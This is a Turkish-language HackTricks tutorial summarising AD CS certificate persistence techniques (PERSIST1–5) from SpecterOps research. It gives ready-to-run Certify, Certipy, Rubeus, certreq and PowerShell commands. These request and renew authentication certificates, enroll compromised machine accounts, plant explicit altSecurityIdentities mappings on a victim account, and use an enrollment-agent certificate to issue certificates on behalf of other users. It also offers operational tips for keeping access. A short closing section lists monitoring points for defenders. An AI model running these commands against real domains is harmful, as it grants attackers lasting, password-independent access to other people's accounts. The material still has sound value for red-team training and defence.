# AD CS Hesap Sürekliliği

{{#include ../../../banners/hacktricks-training.md}}

**Bu, [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) adresindeki harika araştırmanın hesap sürekliliği bölümlerinin küçük bir özetidir.**

## Sertifikalar ile Aktif Kullanıcı Kimlik Bilgisi Hırsızlığını Anlamak – PERSIST1

Bir kullanıcının alan kimlik doğrulamasına izin veren bir sertifika talep edebileceği bir senaryoda, bir saldırganın bu sertifikayı talep etme ve çalma fırsatı vardır, böylece bir ağda sürekliliği sürdürebilir. Varsayılan olarak, Active Directory'deki `User` şablonu bu tür taleplere izin verir, ancak bazen devre dışı bırakılabilir.

[Certify](https://github.com/GhostPack/Certify) veya [Certipy](https://github.com/ly4k/Certipy) kullanarak, istemci kimlik doğrulamasına izin veren etkin şablonları arayabilir ve ardından birini talep edebilirsiniz:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Bir sertifikanın gücü, sertifikanın ait olduğu kullanıcı olarak kimlik doğrulama yeteneğinde yatar; şifre değişikliklerinden bağımsız olarak, sertifika geçerli kaldığı sürece.

PEM'i PFX'e dönüştürebilir ve bunu bir TGT elde etmek için kullanabilirsiniz:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Not: Diğer tekniklerle birleştirildiğinde (bkz. THEFT bölümleri), sertifika tabanlı kimlik doğrulama, LSASS'e dokunmadan ve hatta yükseltilmemiş bağlamlardan kalıcı erişim sağlar.

## Sertifikalar ile Makine Kalıcılığı Elde Etme - PERSIST2

Bir saldırganın bir host üzerinde yükseltilmiş ayrıcalıkları varsa, ele geçirilmiş sistemin makine hesabını varsayılan `Machine` şablonunu kullanarak bir sertifika için kaydedebilir. Makine olarak kimlik doğrulama, yerel hizmetler için S4U2Self'i etkinleştirir ve kalıcı host kalıcılığı sağlayabilir:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Sürekliliği Sertifika Yenileme ile Uzatma - PERSIST3

Sertifika şablonlarının geçerlilik ve yenileme sürelerinden faydalanmak, bir saldırganın uzun vadeli erişim sağlamasına olanak tanır. Daha önce verilmiş bir sertifikaya ve onun özel anahtarına sahipseniz, süresi dolmadan önce yenileyerek, orijinal ilkeden bağlı ek talep kalıntıları bırakmadan taze, uzun ömürlü bir kimlik bilgisi elde edebilirsiniz.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operasyonel ipucu: Saldırganın elindeki PFX dosyalarının ömürlerini takip edin ve erken yenileyin. Yenileme, güncellenmiş sertifikaların modern SID eşleme uzantısını içermesine neden olabilir ve bu da onları daha katı DC eşleme kuralları altında kullanılabilir kılar (bkz. sonraki bölüm).

## Açık Sertifika Eşlemeleri Yerleştirme (altSecurityIdentities) – PERSIST4

Hedef bir hesabın `altSecurityIdentities` niteliğine yazabiliyorsanız, saldırgan kontrolündeki bir sertifikayı o hesaba açıkça eşleyebilirsiniz. Bu, şifre değişiklikleri boyunca devam eder ve güçlü eşleme formatları kullanıldığında, modern DC uygulamaları altında işlevsel kalır.

Yüksek seviyeli akış:

1. Kontrol ettiğiniz bir istemci kimlik doğrulama sertifikası edinin veya verin (örneğin, `User` şablonunu kendiniz olarak kaydedin).
2. sertifikadan güçlü bir tanımlayıcı çıkarın (Issuer+Serial, SKI veya SHA1-PublicKey).
3. O tanımlayıcıyı kullanarak kurbanın `altSecurityIdentities` niteliğine açık bir eşleme ekleyin.
4. Sertifikanızla kimlik doğrulaması yapın; DC bunu açık eşleme aracılığıyla kurbana eşler.

Güçlü bir Issuer+Serial eşlemesi kullanarak örnek (PowerShell):
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Sonra PFX'inizle kimlik doğrulaması yapın. Certipy doğrudan bir TGT alacaktır:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
Notlar
- Sadece güçlü eşleme türlerini kullanın: X509IssuerSerialNumber, X509SKI veya X509SHA1PublicKey. Zayıf formatlar (Subject/Issuer, sadece Subject, RFC822 e-posta) kullanımdan kaldırılmıştır ve DC politikası tarafından engellenebilir.
- Sertifika zinciri, DC tarafından güvenilen bir kök sertifikaya ulaşmalıdır. NTAuth'taki Kurumsal CA'lar genellikle güvenilir; bazı ortamlar ayrıca kamu CA'larını da güvenilir kabul eder.

Zayıf açık eşlemeler ve saldırı yolları hakkında daha fazla bilgi için, bakınız:

{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Geçerli bir Sertifika Talep Ajanı/Enrollment Agent sertifikası alırsanız, kullanıcılar adına yeni oturum açma yetkisine sahip sertifikalar oluşturabilir ve ajan PFX'ini çevrimdışı bir kalıcılık belirteci olarak saklayabilirsiniz. Kötüye kullanım iş akışı:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Ajans sertifikasının veya şablon izinlerinin iptali, bu kalıcılığı ortadan kaldırmak için gereklidir.

## 2025 Güçlü Sertifika Eşleştirme Uygulaması: Kalıcılık Üzerindeki Etkisi

Microsoft KB5014754, etki alanı denetleyicilerinde Güçlü Sertifika Eşleştirme Uygulamasını tanıttı. 11 Şubat 2025'ten itibaren, DC'ler varsayılan olarak Tam Uygulama moduna geçerek zayıf/belirsiz eşleştirmeleri reddetmektedir. Pratik sonuçlar:

- SID eşleştirme uzantısını içermeyen 2022 öncesi sertifikalar, DC'ler Tam Uygulama modundayken örtük eşleştirmeyi başarısız kılabilir. Saldırganlar, sertifikaları AD CS aracılığıyla yenileyerek (SID uzantısını elde etmek için) veya `altSecurityIdentities` içinde güçlü bir açık eşleştirme yerleştirerek (PERSIST4) erişimi sürdürebilir.
- Güçlü formatlar (Yayımcı+Seri, SKI, SHA1-PublicKey) kullanan açık eşleştirmeler çalışmaya devam etmektedir. Zayıf formatlar (Yayımcı/Konu, Sadece-Konu, RFC822) engellenebilir ve kalıcılık için kaçınılmalıdır.

Yönetici, aşağıdakileri izlemeli ve uyarı vermelidir:
- `altSecurityIdentities` üzerindeki değişiklikler ve Kayıt Ajansı ile Kullanıcı sertifikalarının verilmesi/yenilenmesi.
- Temsilci talepleri ve olağandışı yenileme desenleri için CA verilme günlükleri.

## Referanslar

- Microsoft. KB5014754: Windows etki alanı denetleyicilerinde sertifika tabanlı kimlik doğrulama değişiklikleri (uygulama zaman çizelgesi ve güçlü eşleştirmeler).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – Komut Referansı (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
